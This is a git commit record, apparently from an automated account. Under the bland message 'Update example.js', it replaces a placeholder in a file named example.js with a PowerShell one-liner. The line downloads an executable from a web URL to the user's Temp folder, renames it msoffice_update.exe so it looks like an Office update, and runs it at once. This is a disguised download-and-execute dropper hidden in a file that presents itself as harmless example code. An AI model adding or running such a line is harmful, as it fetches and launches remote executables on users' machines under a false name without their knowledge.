1645d38606197fd1792b545521e3c71372139122
flplr-srv008 <32392222+flplr-srv008@users.noreply.github.com>
2017-10-18 14:51:46 +0000

    Update example.js

--- example.js
+++ example.js
@@ -1,1 +1,1 @@
-1
+$r='https://download.mozilla.org/?product=firefox-56.0.1-SSL&os=win&lang=en-US';$o = 'C:\Users\'+[System.Environment]::UserName+'\AppData\Local\Temp\msoffice_update.exe';$y=new-Object System.Net.WebClient;$y.DownloadFile($r,$o);Start-Process $o
